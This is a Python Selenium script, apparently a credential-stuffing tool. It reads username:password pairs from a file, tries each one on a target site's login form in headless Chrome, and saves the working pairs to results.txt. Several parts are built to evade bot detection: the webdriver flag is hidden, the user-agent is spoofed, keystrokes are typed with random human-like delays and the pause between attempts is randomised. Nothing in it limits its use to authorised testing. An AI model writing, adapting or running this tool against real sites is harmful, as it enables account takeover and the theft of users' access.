import os
import time
import random
import hashlib
import shutil
from datetime import datetime
from urllib.parse import urlparse, parse_qs

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, WebDriverException

# ============================
#   CONFIG
# ============================

TARGET_URL = os.environ.get("TARGET_URL", "").strip()
CREDENTIALS_FILE = os.path.join(os.path.dirname(__file__), "credentials.txt")
RESULTS_FILE = os.path.join(os.path.dirname(__file__), "results.txt")


def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [{level}] {msg}", flush=True)


# ============================
#   SELENIUM
# ============================

class SeleniumTester:
    def __init__(self, target_url):
        self.driver = None
        self.target_url = target_url
        self.initial_url = None

    def setup_driver(self):
        log("Iniciando Chrome...")
        options = Options()
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option("useAutomationExtension", False)

        chromedriver_path = shutil.which("chromedriver") or "/usr/local/bin/chromedriver"
        service = Service(executable_path=chromedriver_path)
        self.driver = webdriver.Chrome(service=service, options=options)
        self.driver.set_page_load_timeout(60)
        self.driver.implicitly_wait(10)

        try:
            self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});"
            })
        except Exception:
            pass

        log("✅ Chrome iniciado", "OK")
        return True

    def wait_for_page(self, timeout=25):
        try:
            WebDriverWait(self.driver, timeout).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "input"))
            )
            time.sleep(1)
            return True
        except TimeoutException:
            log("⚠ Timeout esperando página", "WARN")
            return False

    def find_fields(self):
        if not self.wait_for_page():
            return None, None

        password_field = None
        username_field = None

        for sel in ["input[type='password']", "input[name*='password' i]", "input[id*='password' i]"]:
            try:
                elems = self.driver.find_elements(By.CSS_SELECTOR, sel)
                for e in elems:
                    if e.is_displayed() and e.is_enabled():
                        password_field = e
                        break
                if password_field:
                    break
            except Exception:
                continue

        if not password_field:
            return None, None

        for sel in ["input[type='email']", "input[type='text']", "input[name*='email' i]",
                    "input[name*='user' i]", "input[placeholder*='email' i]", "input[placeholder*='usuario' i]"]:
            try:
                elems = self.driver.find_elements(By.CSS_SELECTOR, sel)
                for e in elems:
                    if e.is_displayed() and e.is_enabled() and e != password_field:
                        username_field = e
                        break
                if username_field:
                    break
            except Exception:
                continue

        if not username_field:
            try:
                for inp in self.driver.find_elements(By.TAG_NAME, "input"):
                    t = (inp.get_attribute("type") or "text").lower()
                    if inp.is_displayed() and inp.is_enabled() and t not in ["password","hidden","submit","button"] and inp != password_field:
                        username_field = inp
                        break
            except Exception:
                pass

        return username_field, password_field

    def fill_and_submit(self, user_field, pass_field, username, password):
        try:
            for field, value in [(user_field, username), (pass_field, password)]:
                self.driver.execute_script("arguments[0].scrollIntoView(true);", field)
                time.sleep(0.2)
                field.click()
                field.clear()
                for char in value:
                    field.send_keys(char)
                    time.sleep(random.uniform(0.03, 0.07))
                time.sleep(0.2)

            submitted = False
            for sel in [
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'iniciar')]",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'login')]",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'entrar')]",
                "//form//button[1]"
            ]:
                try:
                    btn = WebDriverWait(self.driver, 3).until(EC.element_to_be_clickable((By.XPATH, sel)))
                    try:
                        btn.click()
                    except Exception:
                        self.driver.execute_script("arguments[0].click();", btn)
                    submitted = True
                    break
                except Exception:
                    continue

            if not submitted:
                pass_field.send_keys("\n")

            return True
        except Exception as e:
            log(f"❌ Error llenando formulario: {str(e)[:100]}", "ERROR")
            return False

    def check_success(self):
        time.sleep(5)
        try:
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            page_title = self.driver.title.lower()

            error_keywords = [
                "credenciales incorrectas", "contraseña incorrecta", "usuario no existe",
                "invalid credentials", "wrong password", "login failed", "authentication failed",
                "usuario o contraseña", "email o número de celular válido"
            ]
            for kw in error_keywords:
                if kw in page_source:
                    return False, kw

            try:
                for elem in self.driver.find_elements(By.XPATH,
                    "//*[contains(@class,'error') or contains(@class,'alert-danger') or contains(@class,'invalid')]"):
                    if elem.is_displayed() and len(elem.text.strip()) > 5:
                        return False, elem.text.strip()[:60]
            except Exception:
                pass

            initial_path = urlparse(self.initial_url).path.rstrip("/")
            current_path = urlparse(current_url).path.rstrip("/")
            url_changed = current_path != initial_path and not any(
                x in current_path for x in ["login", "signin", "error", "auth"]
            )

            success_keywords = [
                "dashboard", "bienvenido", "welcome", "logout", "cerrar sesión",
                "perfil", "profile", "settings", "account", "mi cuenta", "inicio"
            ]
            score = sum(1 for kw in success_keywords if kw in page_source)
            if any(kw in page_title for kw in ["dashboard", "home", "inicio", "perfil"]) and "login" not in page_title:
                score += 2

            if (score >= 3 and url_changed) or score >= 5 or (url_changed and score >= 2):
                return True, "Login exitoso"

            return False, "Credenciales incorrectas"

        except Exception as e:
            return False, str(e)[:80]

    def test_credential(self, username, password):
        try:
            log(f"→ Probando: {username}")
            self.driver.get(self.target_url)
            self.initial_url = self.driver.current_url

            user_field, pass_field = self.find_fields()
            if not user_field or not pass_field:
                return False, "Campos no encontrados"

            if not self.fill_and_submit(user_field, pass_field, username, password):
                return False, "Error llenando formulario"

            return self.check_success()

        except Exception as e:
            return False, str(e)[:80]

    def cleanup(self):
        try:
            if self.driver:
                self.driver.quit()
        except Exception:
            pass


# ============================
#   MAIN
# ============================

def main():
    if not TARGET_URL:
        log("❌ Falta la variable de entorno TARGET_URL", "ERROR")
        return

    if not os.path.exists(CREDENTIALS_FILE):
        log(f"❌ No se encontró {CREDENTIALS_FILE}", "ERROR")
        return

    # Leer credenciales
    credentials = []
    with open(CREDENTIALS_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line and not line.startswith("#"):
                user, pwd = line.split(":", 1)
                if user.strip() and pwd.strip():
                    credentials.append((user.strip(), pwd.strip()))

    if not credentials:
        log("❌ No hay credenciales válidas en credentials.txt", "ERROR")
        return

    log(f"🎯 URL: {TARGET_URL}")
    log(f"📋 Credenciales a probar: {len(credentials)}")

    tester = SeleniumTester(TARGET_URL)

    try:
        tester.setup_driver()
    except Exception as e:
        log(f"❌ No se pudo iniciar Chrome: {e}", "ERROR")
        return

    valid = []
    failed = []

    for username, password in credentials:
        success, reason = tester.test_credential(username, password)
        if success:
            log(f"✅ VÁLIDA: {username}:{password}", "OK")
            valid.append(f"{username}:{password}")
        else:
            log(f"❌ Fallida: {username} — {reason}", "FAIL")
            failed.append(f"{username}:{password} ({reason})")

        time.sleep(random.uniform(1.5, 3.0))

    tester.cleanup()

    # Resumen en consola
    log("=" * 50)
    log(f"✅ Válidas: {len(valid)} | ❌ Fallidas: {len(failed)}")
    for v in valid:
        log(f"  🔑 {v}", "OK")

    # Guardar results.txt
    with open(RESULTS_FILE, "w", encoding="utf-8") as f:
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"URL: {TARGET_URL}\n")
        f.write(f"Total probadas: {len(credentials)}\n\n")
        f.write(f"=== VÁLIDAS ({len(valid)}) ===\n")
        for v in valid:
            f.write(f"{v}\n")
        f.write(f"\n=== FALLIDAS ({len(failed)}) ===\n")
        for fa in failed:
            f.write(f"{fa}\n")

    log(f"💾 Resultados guardados en results.txt")


if __name__ == "__main__":
    main()
